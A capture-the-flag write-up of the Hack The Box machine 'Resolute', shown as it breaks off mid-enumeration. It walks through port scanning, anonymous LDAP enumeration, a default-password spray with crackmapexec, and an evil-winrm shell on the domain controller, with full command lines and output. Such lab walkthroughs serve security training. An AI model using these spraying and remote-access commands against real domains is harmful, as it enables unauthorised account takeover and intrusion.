# [resolute](https://app.hackthebox.com/machines/Resolute)

> A Windows Active Directory domain controller that allows anonymous bind access to its LDAP service, making it possible for an uncredentialed attacker to enumerate domain information. One of the user accounts has a default password revealed in its description attribute. Though the password doesn't work for that particular user account, spraying it with the other discovered usernames reveals a valid credential. This credential grants remote command execution access to the domain controller via WinRM. The domain controller logs PowerShell transcript history to a non-standard location and the transcript file reveals the password of another user account that also has access to the domain controller via WinRM. This user is in the `DnsAdmins` group, which is capable of modifying the domain controller's DNS server to execute an arbitrary DLL as `NT AUTHORITY/SYSTEM`. This configuration can be exploited to change the domain administrator's password and receive full control of the domain controller.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 10.129.1.152 --rate=1000 -e tun0 --output-format grepable --output-filename resolute.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-06 23:43:02 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat resolute.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49671,49676,49677,49682,49696,49718,53,593,5985,636,88,9389,                                     
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49671,49676,49677,49682,49696,49718,53,593,5985,636,88,9389 10.129.1.152 -oA resolute
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 19:46 EDT
Nmap scan report for 10.129.1.152
Host is up (0.040s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2021-11-06 23:53:23Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49682/tcp open   msrpc        Microsoft Windows RPC
49696/tcp open   msrpc        Microsoft Windows RPC
49718/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/6%OT=53%CT=49718%CU=31341%PV=Y%DS=2%DC=I%G=Y%TM=618
OS:71415%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=I%CI=I%II=I%SS=S
OS:%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O
OS:5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6
OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m00s, deviation: 4h02m29s, median: 6m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-11-06T23:54:24
|_  start_date: 2021-11-06T23:48:48
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2021-11-06T16:54:22-07:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.26 seconds
```

The ports 53, 88, 389, and 636 all indicate the target is a Windows Active Directory domain controller. The LDAP output and the output from `nmap`'s `smb-os-discovery` script indicate the domain name is `megabank.local` and the target's host name is `resolute.megabank.local`. The target operating system is Windows Server 2016.

---

## SMB Enumeration

```bash
$ smbmap -u "" -p "" -P 445 -H 10.129.1.152
[+] IP: 10.129.1.152:445        Name: 10.129.1.152
```

```bash
$ smbmap -u "guest" -p "" -P 445 -H 10.129.1.152
[!] Authentication error on 10.129.1.152
```

No anonymous or guest access to SMB.

---

## LDAP Enumeration

Using `ldapsearch` with no credentials indicates that the target's LDAP port can be queried anonymously. Extract domain information via LDAP.

### Domain Users

```bash
$ ldapsearch -LLL -x -h 10.129.1.152 -p 389 -b 'dc=megabank,dc=local' '(&(objectclass=user)(name=*))' name samaccountname description
dn: CN=Guest,CN=Users,DC=megabank,DC=local
description: Built-in account for guest access to the computer/domain
name: Guest
sAMAccountName: Guest

dn: CN=DefaultAccount,CN=Users,DC=megabank,DC=local
description: A user account managed by the system.
name: DefaultAccount
sAMAccountName: DefaultAccount

dn: CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
name: RESOLUTE
sAMAccountName: RESOLUTE$

dn: CN=MS02,CN=Computers,DC=megabank,DC=local
name: MS02
sAMAccountName: MS02$

dn: CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
name: Ryan Bertrand
sAMAccountName: ryan

dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
description: Account created. Password set to Welcome123!
name: Marko Novak
sAMAccountName: marko

dn: CN=Sunita Rahman,CN=Users,DC=megabank,DC=local
name: Sunita Rahman
sAMAccountName: sunita

dn: CN=Abigail Jeffers,CN=Users,DC=megabank,DC=local
name: Abigail Jeffers
sAMAccountName: abigail

dn: CN=Marcus Strong,CN=Users,DC=megabank,DC=local
name: Marcus Strong
sAMAccountName: marcus

dn: CN=Sally May,CN=Users,DC=megabank,DC=local
name: Sally May
sAMAccountName: sally

dn: CN=Fred Carr,CN=Users,DC=megabank,DC=local
name: Fred Carr
sAMAccountName: fred

dn: CN=Angela Perkins,CN=Users,DC=megabank,DC=local
name: Angela Perkins
sAMAccountName: angela

dn: CN=Felicia Carter,CN=Users,DC=megabank,DC=local
name: Felicia Carter
sAMAccountName: felicia

dn: CN=Gustavo Pallieros,CN=Users,DC=megabank,DC=local
name: Gustavo Pallieros
sAMAccountName: gustavo

dn: CN=Ulf Berg,CN=Users,DC=megabank,DC=local
name: Ulf Berg
sAMAccountName: ulf

dn: CN=Stevie Gerrard,CN=Users,DC=megabank,DC=local
name: Stevie Gerrard
sAMAccountName: stevie

dn: CN=Claire Norman,CN=Users,DC=megabank,DC=local
name: Claire Norman
sAMAccountName: claire

dn: CN=Paulo Alcobia,CN=Users,DC=megabank,DC=local
name: Paulo Alcobia
sAMAccountName: paulo

dn: CN=Steve Rider,CN=Users,DC=megabank,DC=local
name: Steve Rider
sAMAccountName: steve

dn: CN=Annette Nilsson,CN=Users,DC=megabank,DC=local
name: Annette Nilsson
sAMAccountName: annette

dn: CN=Annika Larson,CN=Users,DC=megabank,DC=local
name: Annika Larson
sAMAccountName: annika

dn: CN=Per Olsson,CN=Users,DC=megabank,DC=local
name: Per Olsson
sAMAccountName: per

dn: CN=Claude Segal,CN=Users,DC=megabank,DC=local
name: Claude Segal
sAMAccountName: claude

dn: CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
name: Melanie Purkis
sAMAccountName: melanie

dn: CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
name: Zach Armstrong
sAMAccountName: zach

dn: CN=Simon Faraday,CN=Users,DC=megabank,DC=local
name: Simon Faraday
sAMAccountName: simon

dn: CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
name: Naoki Yamamoto
sAMAccountName: naoki

# refldap://ForestDnsZones.megabank.local/DC=ForestDnsZones,DC=megabank,DC=loca
 l

# refldap://DomainDnsZones.megabank.local/DC=DomainDnsZones,DC=megabank,DC=loca
 l

# refldap://megabank.local/CN=Configuration,DC=megabank,DC=local
```

The discovered non-standard usernames:

```txt
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

`marko`'s `description` reveals his password: `Account created. Password set to Welcome123!`.

### Computers

```bash
$ ldapsearch -LLL -x -h 10.129.1.152 -p 389 -b 'dc=megabank,dc=local' '(&(objectclass=computer)(name=*))' name sAMAccountName
dn: CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
name: RESOLUTE
sAMAccountName: RESOLUTE$

dn: CN=MS02,CN=Computers,DC=megabank,DC=local
name: MS02
sAMAccountName: MS02$

# refldap://ForestDnsZones.megabank.local/DC=ForestDnsZones,DC=megabank,DC=loca
 l

# refldap://DomainDnsZones.megabank.local/DC=DomainDnsZones,DC=megabank,DC=loca
 l

# refldap://megabank.local/CN=Configuration,DC=megabank,DC=local
```

`RESOLUTE$` and `MS02$`.

### Groups

```bash
$ ldapsearch -LLL -x -h 10.129.1.152 -p 389 -b 'dc=megabank,dc=local' '(&(objectclass=group)(name=*))' name sAMAccountName operatingsystem
dn: CN=Users,CN=Builtin,DC=megabank,DC=local
name: Users
sAMAccountName: Users

dn: CN=Guests,CN=Builtin,DC=megabank,DC=local
name: Guests
sAMAccountName: Guests

dn: CN=Remote Desktop Users,CN=Builtin,DC=megabank,DC=local
name: Remote Desktop Users
sAMAccountName: Remote Desktop Users

dn: CN=Network Configuration Operators,CN=Builtin,DC=megabank,DC=local
name: Network Configuration Operators
sAMAccountName: Network Configuration Operators

dn: CN=Performance Monitor Users,CN=Builtin,DC=megabank,DC=local
name: Performance Monitor Users
sAMAccountName: Performance Monitor Users

dn: CN=Performance Log Users,CN=Builtin,DC=megabank,DC=local
name: Performance Log Users
sAMAccountName: Performance Log Users

dn: CN=Distributed COM Users,CN=Builtin,DC=megabank,DC=local
name: Distributed COM Users
sAMAccountName: Distributed COM Users

dn: CN=IIS_IUSRS,CN=Builtin,DC=megabank,DC=local
name: IIS_IUSRS
sAMAccountName: IIS_IUSRS

dn: CN=Cryptographic Operators,CN=Builtin,DC=megabank,DC=local
name: Cryptographic Operators
sAMAccountName: Cryptographic Operators

dn: CN=Event Log Readers,CN=Builtin,DC=megabank,DC=local
name: Event Log Readers
sAMAccountName: Event Log Readers

dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=megabank,DC=local
name: Certificate Service DCOM Access
sAMAccountName: Certificate Service DCOM Access

dn: CN=RDS Remote Access Servers,CN=Builtin,DC=megabank,DC=local
name: RDS Remote Access Servers
sAMAccountName: RDS Remote Access Servers

dn: CN=RDS Endpoint Servers,CN=Builtin,DC=megabank,DC=local
name: RDS Endpoint Servers
sAMAccountName: RDS Endpoint Servers

dn: CN=RDS Management Servers,CN=Builtin,DC=megabank,DC=local
name: RDS Management Servers
sAMAccountName: RDS Management Servers

dn: CN=Hyper-V Administrators,CN=Builtin,DC=megabank,DC=local
name: Hyper-V Administrators
sAMAccountName: Hyper-V Administrators

dn: CN=Access Control Assistance Operators,CN=Builtin,DC=megabank,DC=local
name: Access Control Assistance Operators
sAMAccountName: Access Control Assistance Operators

dn: CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
name: Remote Management Users
sAMAccountName: Remote Management Users

dn: CN=System Managed Accounts Group,CN=Builtin,DC=megabank,DC=local
name: System Managed Accounts Group
sAMAccountName: System Managed Accounts Group

dn: CN=Storage Replica Administrators,CN=Builtin,DC=megabank,DC=local
name: Storage Replica Administrators
sAMAccountName: Storage Replica Administrators

dn: CN=Domain Computers,CN=Users,DC=megabank,DC=local
name: Domain Computers
sAMAccountName: Domain Computers

dn: CN=Cert Publishers,CN=Users,DC=megabank,DC=local
name: Cert Publishers
sAMAccountName: Cert Publishers

dn: CN=Domain Users,CN=Users,DC=megabank,DC=local
name: Domain Users
sAMAccountName: Domain Users

dn: CN=Domain Guests,CN=Users,DC=megabank,DC=local
name: Domain Guests
sAMAccountName: Domain Guests

dn: CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=local
name: Group Policy Creator Owners
sAMAccountName: Group Policy Creator Owners

dn: CN=RAS and IAS Servers,CN=Users,DC=megabank,DC=local
name: RAS and IAS Servers
sAMAccountName: RAS and IAS Servers

dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=megabank,DC=local
name: Pre-Windows 2000 Compatible Access
sAMAccountName: Pre-Windows 2000 Compatible Access

dn: CN=Incoming Forest Trust Builders,CN=Builtin,DC=megabank,DC=local
name: Incoming Forest Trust Builders
sAMAccountName: Incoming Forest Trust Builders

dn: CN=Windows Authorization Access Group,CN=Builtin,DC=megabank,DC=local
name: Windows Authorization Access Group
sAMAccountName: Windows Authorization Access Group

dn: CN=Terminal Server License Servers,CN=Builtin,DC=megabank,DC=local
name: Terminal Server License Servers
sAMAccountName: Terminal Server License Servers

dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name: Allowed RODC Password Replication Group
sAMAccountName: Allowed RODC Password Replication Group

dn: CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name: Denied RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group

dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=megabank,DC=local
name: Enterprise Read-only Domain Controllers
sAMAccountName: Enterprise Read-only Domain Controllers

dn: CN=Cloneable Domain Controllers,CN=Users,DC=megabank,DC=local
name: Cloneable Domain Controllers
sAMAccountName: Cloneable Domain Controllers

dn: CN=Protected Users,CN=Users,DC=megabank,DC=local
name: Protected Users
sAMAccountName: Protected Users

dn: CN=Key Admins,CN=Users,DC=megabank,DC=local
name: Key Admins
sAMAccountName: Key Admins

dn: CN=Enterprise Key Admins,CN=Users,DC=megabank,DC=local
name: Enterprise Key Admins
sAMAccountName: Enterprise Key Admins

dn: CN=DnsAdmins,CN=Users,DC=megabank,DC=local
name: DnsAdmins
sAMAccountName: DnsAdmins

dn: CN=DnsUpdateProxy,CN=Users,DC=megabank,DC=local
name: DnsUpdateProxy
sAMAccountName: DnsUpdateProxy

dn: CN=Contractors,OU=Groups,DC=megabank,DC=local
name: Contractors
sAMAccountName: Contractors

# refldap://ForestDnsZones.megabank.local/DC=ForestDnsZones,DC=megabank,DC=loca
 l

# refldap://DomainDnsZones.megabank.local/DC=DomainDnsZones,DC=megabank,DC=loca
 l

# refldap://megabank.local/CN=Configuration,DC=megabank,DC=local
```

The only non-standard group is `Contractors`.

---

## ASREP Roasting

Determine if any of the discovered users have Kerberos pre-authentication disabled.

```bash
$ impacket-GetNPUsers -dc-ip 10.129.1.152 megabank.local/ -usersfile users.txt -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
```

None of them do.

---

## Credential Confirmation

Confirm the credential `marko`:`Welcome123!` is valid.

```bash
$ SMB         10.129.1.152    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

It isn't. Try to spray the same password with the rest of the usernames gathered during LDAP enumeration.

```bash
$ crackmapexec smb 10.129.1.152 -d megabank.local -u users.txt -p 'Welcome123!'
SMB         10.129.1.152    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.1.152    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

It appears that `melanie`'s password is `Welcome123!`.

---

## Foothold as `melanie`

Use `melanie`'s credential to access the machine via WinRM and grab the user flag.

```bash
$ evil-winrm -i 10.129.251.7 -u megabank.local\\melanie -p 'Welcome123!'                                                                               1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> ls ../Desktop


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:33 AM             32 user.txt
```

---

## Domain Enumeration

Use the credential `melanie`:`Welcome123!` to further enumerate the domain.

### Domain Users

```bash
$ pywerview get-netuser -w megabank.local -u melanie -p 'Welcome123!' --dc-ip 10.129.251.7
accountexpires:                0
admincount:                    1
badpasswordtime:               2019-12-03 08:09:30.345949
badpwdcount:                   0
cn:                            Administrator
codepage:                      0
countrycode:                   0
description:                   Built-in account for administering the computer/domain
distinguishedname:             CN=Administrator,CN=Users,DC=megabank,DC=local
dscorepropagationdata:         2019-09-27 22:10:48,
                               2019-09-27 10:52:19,
                               2019-09-25 13:44:22,
                               2019-09-25 13:29:12,
                               1601-07-14 04:20:16
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-07 00:03:55.351285
lastlogontimestamp:            132807314353512845
logoncount:                    63
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:                      CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=local,
                               CN=Domain Admins,CN=Users,DC=megabank,DC=local,
                               CN=Enterprise Admins,CN=Users,DC=megabank,DC=local,
                               CN=Schema Admins,CN=Users,DC=megabank,DC=local,
                               CN=Administrators,CN=Builtin,DC=megabank,DC=local
msds-supportedencryptiontypes: 0
name:                          Administrator
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    d5755f95-25a9-4798-b'82d7'-862601e12c8d
objectsid:                     S-1-5-21-1392959593-3013219662-3596683436-500
primarygroupid:                513
profilepath:
pwdlastset:                    2019-12-04 09:31:02.539373
samaccountname:                Administrator
samaccounttype:                805306368
scriptpath:
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:                    159800
usncreated:                    8196
whenchanged:                   2021-11-07 04:03:55
whencreated:                   2019-09-25 13:28:31

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     Guest
codepage:               0
countrycode:            0
description:            Built-in account for guest access to the computer/domain
distinguishedname:      CN=Guest,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Guests,CN=Builtin,DC=megabank,DC=local
name:                   Guest
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             bf345b75-3cc6-4e92-b'80eb'-2244f03e669b
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-501
primarygroupid:         514
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         Guest
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8197
usncreated:             8197
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     DefaultAccount
codepage:               0
countrycode:            0
description:            A user account managed by the system.
distinguishedname:      CN=DefaultAccount,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=System Managed Accounts Group,CN=Builtin,DC=megabank,DC=local
name:                   DefaultAccount
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             263e5c28-d452-44e2-b'9f44'-adddeedb5c41
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-503
primarygroupid:         513
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         DefaultAccount
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8198
usncreated:             8198
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

accountexpires:                9223372036854775807
admincount:                    1
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            krbtgt
codepage:                      0
countrycode:                   0
description:                   Key Distribution Center Service Account
distinguishedname:             CN=krbtgt,CN=Users,DC=megabank,DC=local
dscorepropagationdata:         2019-09-27 22:10:48,
                               2019-09-27 10:52:19,
                               2019-09-25 13:44:22,
                               2019-09-25 13:29:12,
                               1601-07-14 04:20:16
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     1600-12-31 19:03:58
logoncount:                    0
memberof:                      CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
msds-supportedencryptiontypes: 0
name:                          krbtgt
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    7f638b10-cfbf-45e4-b'84bb'-3be922c4d2e0
objectsid:                     S-1-5-21-1392959593-3013219662-3596683436-502
primarygroupid:                513
profilepath:
pwdlastset:                    2019-09-25 09:29:12.154667
samaccountname:                krbtgt
samaccounttype:                805306368
scriptpath:
serviceprincipalname:          kadmin/changepw
showinadvancedviewonly:        TRUE
useraccountcontrol:            ['ACCOUNTDISABLE', 'NORMAL_ACCOUNT']
usnchanged:                    12776
usncreated:                    12324
whenchanged:                   2019-09-25 13:44:21
whencreated:                   2019-09-25 13:29:12

accountexpires:                0
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            Ryan Bertrand
codepage:                      0
countrycode:                   0
displayname:                   Ryan Bertrand
distinguishedname:             CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
dscorepropagationdata:         2019-09-27 22:10:48,
                               2019-09-27 10:56:50,
                               1601-01-01 00:00:01
givenname:                     Ryan
homedirectory:
instancetype:                  4
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     1600-12-31 19:03:58
logoncount:                    0
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:                      CN=Contractors,OU=Groups,DC=megabank,DC=local
msds-supportedencryptiontypes: 0
name:                          Ryan Bertrand
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    848c83e3-6cbe-4d3e-b'bacf'-aa7bd37da691
objectsid:                     S-1-5-21-1392959593-3013219662-3596683436-1105
primarygroupid:                513
profilepath:
pwdlastset:                    2019-12-04 09:31:02.273751
samaccountname:                ryan
samaccounttype:                805306368
scriptpath:
sn:                            Bertrand
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:             ryan@megabank.local
usnchanged:                    143432
usncreated:                    13048
whenchanged:                   2019-12-04 14:31:08
whencreated:                   2019-09-27 10:56:50

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Marko Novak
codepage:              0
countrycode:           0
description:           Account created. Password set to Welcome123!
displayname:           Marko Novak
distinguishedname:     CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
dscorepropagationdata: 2019-09-27 22:10:48,
                       2019-09-27 13:17:14,
                       1601-01-01 00:00:01
givenname:             Marko
homedirectory:
